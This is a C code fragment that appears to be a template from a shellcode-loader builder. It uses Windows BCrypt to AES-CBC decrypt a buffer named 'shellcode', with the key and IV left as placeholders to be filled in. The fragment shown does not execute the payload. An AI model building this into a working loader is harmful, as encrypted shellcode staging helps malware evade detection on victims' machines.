    BCRYPT_ALG_HANDLE hAlgAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    unsigned char key[] = { ###AES_KEY### };
    unsigned char iv[] = { ###AES_IV### };

    DWORD cbResult = 0;
    DWORD dwRet = 10;

    /*
    * 1. Open handle to AES algorithm
    */
    if (BCryptOpenAlgorithmProvider(&hAlgAes, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0) != STATUS_SUCCESS) {
        printf("Error opening algorithm provider: %lx\n", GetLastError());
        goto Cleanup;
    }

    /*
    * 2. Set AES chaining mode to CBC
    */
    if (BCryptSetProperty(hAlgAes, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != STATUS_SUCCESS) {
        printf("Error setting chaining mode: %lx\n", GetLastError());
        goto Cleanup;
    }

    /*
    * 3. Import the encryption key.
    */
    if (BCryptGenerateSymmetricKey(hAlgAes, &hKey, NULL, 0, key, sizeof(key), 0) != STATUS_SUCCESS) {
        printf("Error generating symmetric key: %lx\n", GetLastError());
        goto Cleanup;
    }

    /*
    * 4. Decrypt the content.
    */
    if (BCryptDecrypt(hKey, shellcode, sizeof(shellcode), NULL, iv, sizeof(iv), shellcode, sizeof(shellcode), &cbResult, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS) {
        printf("Error decrypting data: %lx\n", GetLastError());
        goto Cleanup;
    }

Cleanup:
    if (NULL != hKey)
        BCryptDestroyKey(hKey);

    if (NULL != hAlgAes)
        BCryptCloseAlgorithmProvider(hAlgAes, 0);
        

    

